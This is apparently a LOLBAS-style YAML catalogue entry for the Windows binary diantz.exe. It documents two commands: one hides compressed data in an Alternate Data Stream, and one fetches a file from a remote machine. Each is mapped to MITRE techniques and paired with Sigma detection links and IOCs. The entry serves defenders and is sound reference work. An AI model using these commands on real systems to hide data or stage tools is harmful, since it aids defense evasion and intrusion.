---
Name: Diantz.exe
Description: Binary that package existing files into a cabinet (.cab) file
Author: 'Tamir Yehuda'
Created: 2020-08-08
Commands:
  - Command: diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab
    Description: Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.
    Usecase: Hide data compressed into an Alternate Data Stream.
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.
  - Command: diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
    Description: Download and compress a remote file and store it in a cab file on local machine.
    Usecase: Download and compress into a cab file.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019
Full_Path:
  - Path: c:\windows\system32\diantz.exe
  - Path: c:\windows\syswow64\diantz.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/0593446f96c57a8b64e2b5b9fd15a20f1c56acab/rules/windows/process_creation/win_pc_lolbas_diantz_ads.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/0f33cbc85bf4b23b8d8308bfcc8b21a9e5431ee7/rules/windows/process_creation/win_pc_lolbas_diantz_remote_cab.yml
  - IOC: diantz storing data into alternate data streams.
  - IOC: diantz getting a file from a remote machine or the internet.
Resources:
  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz
Acknowledgement:
  - Person: Tamir Yehuda
    Handle: '@tim8288'
  - Person: Hai Vaknin
    Handle: '@vakninhai'
---
